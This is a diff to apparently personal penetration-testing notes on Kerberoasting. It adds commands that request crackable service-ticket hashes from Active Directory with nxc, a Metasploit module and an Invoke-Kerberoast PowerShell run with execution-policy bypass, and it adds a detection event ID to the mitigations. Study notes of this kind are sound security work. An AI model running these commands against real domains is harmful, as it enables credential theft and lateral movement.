@@ -30,10 +30,30 @@ using impacket-GetUserSPNs :
 ```bash
 impacket-GetUserSPNs -request -dc-ip 192.168.44.166 UAP.local/fcastle -save -outputfile GetUserSPNs1.out
 
-
-impacket-GetNPUsers FRIEND.local /-dc-ip ipadress -usersfile list.users.txt -request
-
 ```
+
+using nxc:
+```bash
+nxc ldap 192.168.1.53 -u aarti -p Password@1 --kerberoasting hash.txt
+```
+
+using metasploit:
+```bash
+use auxiliary/gather/get_user_spns
+set rhosts 192.168.1.53
+set domain ignite.local
+set user aarti
+set pass Password@1
+run
+```
+
+powershell:
+```bash
+Powershell -ep bypass
+Import-Module .\Invoke-kerberoast.ps1
+Invoke-kerberoast
+```
+
 
 crack hash :
 ```bash
@@ -45,6 +65,9 @@ Mitigation :
 - Limit user/group token creation permission
 - Account tiering
 - Local admin restriction
+-  Key Windows Event ID: 4769
+
+
 ```
 
 
